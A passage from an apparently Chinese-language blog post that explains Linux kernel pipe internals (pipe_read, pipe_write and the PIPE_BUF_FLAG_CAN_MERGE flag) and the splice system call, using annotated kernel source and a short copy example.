class="hljs-comment">//如果管道中没有写入者，跳出循环</span><br><span class="hljs-keyword">if</span> (!pipe-&gt;writers)<br><span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//如果出现错误或已经读取到数据，则跳出循环</span><br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//如果文件标志为非阻塞，并且管道为空，则返回错误码 -EAGAIN</span><br><span class="hljs-keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;<br>ret = -EAGAIN;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>__pipe_unlock(pipe);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We only get here if we didn&#x27;t actually read anything.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * However, we could have seen (and removed) a zero-sized</span><br><span class="hljs-comment"> * pipe buffer, and might have made space in the buffers</span><br><span class="hljs-comment"> * that way.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * You can&#x27;t make zero-sized pipe buffers by doing an empty</span><br><span class="hljs-comment"> * write (not even in packet mode), but they can happen if</span><br><span class="hljs-comment"> * the writer gets an EFAULT when trying to fill a buffer</span><br><span class="hljs-comment"> * that already got allocated and inserted in the buffer</span><br><span class="hljs-comment"> * array.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * So we still need to wake up any pending writers in the</span><br><span class="hljs-comment"> * _very_ unlikely case that the pipe was full, but we got</span><br><span class="hljs-comment"> * no data.</span><br><span class="hljs-comment"> */</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        在释放锁的情况下处理未读取任何数据的情况：</span><br><span class="hljs-comment">如果之前管道已满但未读取任何数据，则唤醒等待的写入者并发送异步通知。</span><br><span class="hljs-comment">如果因中断而退出，则返回错误码 -ERESTARTSYS</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">if</span> (unlikely(was_full)) &#123;<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);<br>kill_fasync(&amp;pipe-&gt;fasync_writers, SIGIO, POLL_OUT);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * But because we didn&#x27;t read anything, at this point we can</span><br><span class="hljs-comment"> * just return directly with -ERESTARTSYS if we&#x27;re interrupted,</span><br><span class="hljs-comment"> * since we&#x27;ve done any required wakeups and there&#x27;s no need</span><br><span class="hljs-comment"> * to mark anything accessed. And we&#x27;ve dropped the lock.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (wait_event_interruptible_exclusive(pipe-&gt;rd_wait, pipe_readable(pipe)) &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -ERESTARTSYS;<br><br>__pipe_lock(pipe);<br>was_full = pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);<br>wake_next_reader = <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (pipe_empty(pipe-&gt;head, pipe-&gt;tail))<br>wake_next_reader = <span class="hljs-literal">false</span>;<br>__pipe_unlock(pipe);<br><br><span class="hljs-keyword">if</span> (was_full) &#123;<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);<br>kill_fasync(&amp;pipe-&gt;fasync_writers, SIGIO, POLL_OUT);<br>&#125;<br><span class="hljs-keyword">if</span> (wake_next_reader)<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);<br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>)<br>file_accessed(filp);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="pipe-write"><a href="#pipe-write" class="headerlink" title="pipe_write"></a>pipe_write</h3><p>向<code>pipe</code>中写入，会调用到<code>pipe_write</code></p><p>首先，如果上一个<code>buffer</code>中有剩余空间，并且此<code>buffer</code>的<code>flag</code>是<strong>PIPE_BUF_FLAG_CAN_MERGE</strong>，会先将此<code>buffer</code>写满</p><p>若还有多的数据，会申请新的<code>buffer</code>，将<code>flag</code>设置为<strong>PIPE_BUF_FLAG_CAN_MERGE</strong>，继续写入</p><p>由此可见，<strong>PIPE_BUF_FLAG_CAN_MERGE</strong>决定了<code>buffer</code>有无写入权限</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br><span class="hljs-title function_">pipe_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *from)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span> =</span> iocb-&gt;ki_filp;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> filp-&gt;private_data;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head;<br><span class="hljs-type">ssize_t</span> ret = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> total_len = iov_iter_count(from);<br><span class="hljs-type">ssize_t</span> chars;<br><span class="hljs-type">bool</span> was_empty = <span class="hljs-literal">false</span>;<br><span class="hljs-type">bool</span> wake_next_writer = <span class="hljs-literal">false</span>;<br><br><span class="hljs-comment">/* Null write succeeds. */</span><br>    <span class="hljs-comment">//如果待写入数据长度为零，则直接返回成功</span><br><span class="hljs-keyword">if</span> (unlikely(total_len == <span class="hljs-number">0</span>))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-comment">//锁定管道以确保并发写入时的数据一致性</span><br>__pipe_lock(pipe);<br><span class="hljs-comment">//检查是否有读取者，如果没有读取者，则发送 SIGPIPE 信号并返回错误码 -EPIPE</span><br><span class="hljs-keyword">if</span> (!pipe-&gt;readers) &#123;<br>send_sig(SIGPIPE, current, <span class="hljs-number">0</span>);<br>ret = -EPIPE;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br>    <span class="hljs-comment">//检查是否启用了监视队列，如果启用了，则返回错误码 -EXDEV</span><br><span class="hljs-keyword">if</span> (pipe-&gt;watch_queue) &#123;<br>ret = -EXDEV;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Only wake up if the pipe started out empty, since</span><br><span class="hljs-comment"> * otherwise there should be no readers waiting.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If it wasn&#x27;t empty we try to merge new data into</span><br><span class="hljs-comment"> * the last buffer.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * That naturally merges small writes, but it also</span><br><span class="hljs-comment"> * page-aligs the rest of the writes for large writes</span><br><span class="hljs-comment"> * spanning multiple pages.</span><br><span class="hljs-comment"> */</span><br>head = pipe-&gt;head;<br>was_empty = pipe_empty(head, pipe-&gt;tail);<span class="hljs-comment">//判断管道是否为空，如果为空，则标记 was_empty 为真</span><br>chars = total_len &amp; (PAGE_SIZE<span class="hljs-number">-1</span>);<br><span class="hljs-keyword">if</span> (chars &amp;&amp; !was_empty) &#123;<span class="hljs-comment">//如果新数据长度不为零且管道不为空，则尝试将新数据与上一个缓冲区合并</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="hljs-number">1</span>) &amp; mask];<br><span class="hljs-type">int</span> offset = buf-&gt;offset + buf-&gt;len;<br><span class="hljs-comment">//如果flag中有PIPE_BUF_FLAG_CAN_MERGE，便把数据写入上一个buffer的剩余空间中</span><br><span class="hljs-keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;<br>    offset + chars &lt;= PAGE_SIZE) &#123;<br>ret = pipe_buf_confirm(pipe, buf);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">goto</span> out;<br><br>ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);<span class="hljs-comment">//拷贝进去</span><br><span class="hljs-keyword">if</span> (unlikely(ret &lt; chars)) &#123;<br>ret = -EFAULT;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><br>buf-&gt;len += ret;<br><span class="hljs-keyword">if</span> (!iov_iter_count(from))<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>&#125;<br><span class="hljs-comment">//进入一个无限循环，直到成功写入数据或遇到错误</span><br><span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-comment">//检查是否有读取者，如果没有读取者，则发送 SIGPIPE 信号并返回错误码 -EPIPE</span><br><span class="hljs-keyword">if</span> (!pipe-&gt;readers) &#123;<br>send_sig(SIGPIPE, current, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -EPIPE;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">//检查管道是否未满，如果未满，则分配一个新的缓冲区用于写入数据</span><br>head = pipe-&gt;head;<br><span class="hljs-keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> pipe-&gt;tmp_page;<br><span class="hljs-type">int</span> copied;<br><br><span class="hljs-keyword">if</span> (!page) &#123;<br>page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);<br><span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br>ret = ret ? : -ENOMEM;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>pipe-&gt;tmp_page = page;<br>&#125;<br><br><span class="hljs-comment">/* Allocate a slot in the ring in advance and attach an</span><br><span class="hljs-comment"> * empty buffer.  If we fault or otherwise fail to use</span><br><span class="hljs-comment"> * it, either the reader will consume it or it&#x27;ll still</span><br><span class="hljs-comment"> * be there for the next write.</span><br><span class="hljs-comment"> */</span><br>spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);<br><br>head = pipe-&gt;head;<br><span class="hljs-keyword">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<br>spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><br>pipe-&gt;head = head + <span class="hljs-number">1</span>;<br>spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br><br><span class="hljs-comment">/* Insert it into the buffer array */</span><br>buf = &amp;pipe-&gt;bufs[head &amp; mask];<br>buf-&gt;page = page;<br>buf-&gt;ops = &amp;anon_pipe_buf_ops;<br>buf-&gt;offset = <span class="hljs-number">0</span>;<br>buf-&gt;len = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (is_packetized(filp))<span class="hljs-comment">//设置 buffer 的 flag，若设置了 O_DIRECT 则为 PACKET</span><br>buf-&gt;flags = PIPE_BUF_FLAG_PACKET;<br><span class="hljs-keyword">else</span><br>buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;<br>pipe-&gt;tmp_page = <span class="hljs-literal">NULL</span>;<br><br>copied = copy_page_from_iter(page, <span class="hljs-number">0</span>, PAGE_SIZE, from);<br><span class="hljs-keyword">if</span> (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) &#123;<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -EFAULT;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>ret += copied;<br>buf-&gt;offset = <span class="hljs-number">0</span>;<br>buf-&gt;len = copied;<br><br><span class="hljs-keyword">if</span> (!iov_iter_count(from))<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))<br><span class="hljs-keyword">continue</span>;<br><br><span class="hljs-comment">/* Wait for buffer space to become available. */</span><br>        <span class="hljs-comment">//如果文件标志为非阻塞，则返回错误码 -EAGAIN</span><br><span class="hljs-keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -EAGAIN;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>        <span class="hljs-comment">//如果当前进程有信号等待，则返回错误码 -ERESTARTSYS</span><br><span class="hljs-keyword">if</span> (signal_pending(current)) &#123;<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -ERESTARTSYS;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We&#x27;re going to release the pipe lock and wait for more</span><br><span class="hljs-comment"> * space. We wake up any readers if necessary, and then</span><br><span class="hljs-comment"> * after waiting we need to re-check whether the pipe</span><br><span class="hljs-comment"> * become empty while we dropped the lock.</span><br><span class="hljs-comment"> */</span><br>        <span class="hljs-comment">//释放管道锁并等待缓冲区空间变得可用，唤醒任何可能正在等待读取的进程。待等待结束后，重新获取管道锁并重新检查管道是否为空，以确定是否需要继续执行写入操作。</span><br>__pipe_unlock(pipe);<br><span class="hljs-keyword">if</span> (was_empty) &#123;<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);<br>kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);<br>&#125;<br>wait_event_interruptible_exclusive(pipe-&gt;wr_wait, pipe_writable(pipe));<br>__pipe_lock(pipe);<br>was_empty = pipe_empty(pipe-&gt;head, pipe-&gt;tail);<br>wake_next_writer = <span class="hljs-literal">true</span>;<br>&#125;<br>out:<br>    <span class="hljs-comment">//在写入完成后，如果之前管道已满，则取消唤醒下一个写入者的操作</span><br><span class="hljs-keyword">if</span> (pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage))<br>wake_next_writer = <span class="hljs-literal">false</span>;<br>__pipe_unlock(pipe);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If we do do a wakeup event, we do a &#x27;sync&#x27; wakeup, because we</span><br><span class="hljs-comment"> * want the reader to start processing things asap, rather than</span><br><span class="hljs-comment"> * leave the data pending.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This is particularly important for small writes, because of</span><br><span class="hljs-comment"> * how (for example) the GNU make jobserver uses small writes to</span><br><span class="hljs-comment"> * wake up pending jobs</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">//解锁管道，并根据情况唤醒等待的读取者或写入者</span><br><span class="hljs-keyword">if</span> (was_empty) &#123;<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);<br>kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);<br>&#125;<br>    <span class="hljs-comment">//如果写入成功且成功获取了文件系统写锁，则更新文件的访问时间</span><br><span class="hljs-keyword">if</span> (wake_next_writer)<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);<br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span> &amp;&amp; sb_start_write_trylock(file_inode(filp)-&gt;i_sb)) &#123;<br><span class="hljs-type">int</span> err = file_update_time(filp);<br><span class="hljs-keyword">if</span> (err)<br>ret = err;<br>sb_end_write(file_inode(filp)-&gt;i_sb);<br>&#125;<br>    <span class="hljs-comment">//返回写入的总字节数 ret</span><br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="何为splice"><a href="#何为splice" class="headerlink" title="何为splice"></a>何为splice</h2><p>一般来说，想要把一个文件的数据拷贝到另一个文件中，常规思路便是打开文件1，复制到用户空间，写入文件2</p><p>但这样用户空间和内核空间之间要进行多次用户拷贝，存在客观的开销</p><p>所以这时候便要提到<strong>splice</strong>这个用于在两个文件描述符之间移动数据的系统调用啦</p><p><code>splice</code> 函数是在 Unix&#x2F;Linux 系统中用于在两个文件描述符之间移动数据的系统调用之一。它通常用于优化数据传输，特别是在文件和管道之间进行零拷贝传输。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">splice</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_in, <span class="hljs-type">loff_t</span> *off_in, <span class="hljs-type">int</span> fd_out, <span class="hljs-type">loff_t</span> *off_out, <span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span>;<br><br>参数说明<br>fd_in：输入文件描述符，数据将从这里读取。<br>off_in：输入文件的偏移量指针，如果为 <span class="hljs-literal">NULL</span>，则使用当前文件偏移量。<br>fd_out：输出文件描述符，数据将写入到这里。<br>off_out：输出文件的偏移量指针，如果为 <span class="hljs-literal">NULL</span>，则使用当前文件偏移量。<br>len：要移动的数据的长度。<br>flags：标志参数，可以是以下之一或它们的组合：<br>SPLICE_F_MOVE：默认行为，表示将数据从输入文件描述符移动到输出文件描述符，这意味着数据在移动后不再存在于输入文件描述符上。<br>SPLICE_F_NONBLOCK：非阻塞模式，如果设置了此标志，函数将以非阻塞模式运行。<br>SPLICE_F_MORE：提示内核等待更多数据，如果设置了此标志，则告诉内核还有更多数据需要移动。这可能会增加性能。<br>SPLICE_F_GIFT：表示将数据所有权移动到输出文件描述符，而不是仅移动数据本身。<br></code></pre></td></tr></table></figure><p>PS：将<code>fd_in</code>传递到文件描述符<code>fd_out</code>，其中文件描述符之一必须引用管道，对于<code>fd_in</code>来说，若其是一个管道文件描述符，则<code>off_in</code>必须被设置为<strong>NULL</strong>，若它不是一个管道描述符，则<code>off_in</code>表示从输入数据流的何处开始读入数据，此时，其被设置为<strong>NULL</strong>，则说明从输入数据的当前偏移位置读入。否则<code>off_in</code>指出具体的偏移位置。以上对于<code>fd_out</code>和<code>off_out</code>同样适用，只不过其用于输出数据流。</p><h3 id="splice-pipe"><a href="#splice-pipe" class="headerlink" title="splice &amp; pipe"></a>splice &amp; pipe</h3><p>针对上述情况，我们只许创建一个管道，然后通过两次<code>splice</code>便能完成两个文件间的数据拷贝</p><p>大概样例如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">......<br>pipe(pipe_fd);<br>src_fd = open(<span class="hljs-string">&quot;source_file&quot;</span>, O_RDWR);<br>splice(tar_fd, <span class="hljs-literal">NULL</span>, pipe_fd[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0x100</span>, SPLICE_F_MOVE);<br><br>dest_fd = open(<span class="hljs-string">&quot;dest_file&quot;</span>, O_RDWR);<br>splice(pipe_fd[<span class="hljs-number">0</span>], <span class="hljs-literal">NULL</span>, dest_fd, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0x100</span>, SPLICE_F_MOVE);<br>......<br></code></pre></td></tr></table></figure><p>无需进行内核空间和用户空间的拷贝，直接在内核完成一条龙服务</p><h3 id="do-splice"><a href="#do-splice" class="headerlink" title="do_splice"></a>do_splice</h3><p>根据管道-&gt;管道、文件-&gt;管道、文件-&gt;管道，分为三个分支</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Determine where to splice to/from.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">do_splice</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *in, <span class="hljs-type">loff_t</span> __user *off_in,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> file *out, <span class="hljs-type">loff_t</span> __user *off_out,</span><br><span class="hljs-params"><span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">ipipe</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">opipe</span>;</span><br><span class="hljs-type">loff_t</span> offset;<br><span class="hljs-type">long</span> ret;<br><br>    <span class="hljs-comment">//通过检查输入和输出文件描述符的模式（mode）来确保它们是可读和可写的文件描述符。如果其中一个不符合要求，则返回错误码-EBADF，表示无效的文件描述符。</span><br><span class="hljs-keyword">if</span> (unlikely(!(in-&gt;f_mode &amp; FMODE_READ) ||<br>     !(out-&gt;f_mode &amp; FMODE_WRITE)))<br><span class="hljs-keyword">return</span> -EBADF;<br>    <br><span class="hljs-comment">//使用get_pipe_info()函数获取输入和输出文件描述符对应的管道信息</span><br>ipipe = get_pipe_info(in, <span class="hljs-literal">true</span>);<br>opipe = get_pipe_info(out, <span class="hljs-literal">true</span>);<br>    <br><span class="hljs-comment">//如果两者都是管道，则进行管道到管道的splice操作</span><br><span class="hljs-keyword">if</span> (ipipe &amp;&amp; opipe) &#123;<br>        <span 